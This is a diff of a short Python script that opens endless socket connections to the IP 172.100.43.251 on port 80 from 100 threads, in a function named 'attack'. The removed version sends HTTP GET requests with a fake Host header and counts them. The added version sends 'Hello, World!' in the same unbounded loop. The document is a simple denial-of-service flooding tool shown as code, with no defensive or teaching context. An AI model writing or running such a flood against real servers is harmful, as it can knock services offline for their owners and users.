@@ -1,29 +1,20 @@
-import requests as req
 import socket
 import threading
 
-# for i in range(10000):
-#     get = req.get("http://172.100.43.251/")
-#     print(f"Request ke-{i} | Status {get.status_code}")
-
 target = '172.100.43.251'
-fake_ip = '182.21.20.32'
 port = 80
 
-attack_num = 0
 
 def attack():
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        
-        global attack_num
-        attack_num += 1
-        print(attack_num)
-        
-        s.close()
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((target, port))
+        data = "Hello, World!".encode()
+        client_socket.send(data)
+        response = client_socket.recv(1024)
+        print("Respons dari server:", response.decode())
+        client_socket.close()
+
 
 for i in range(100):
     thread = threading.Thread(target=attack)
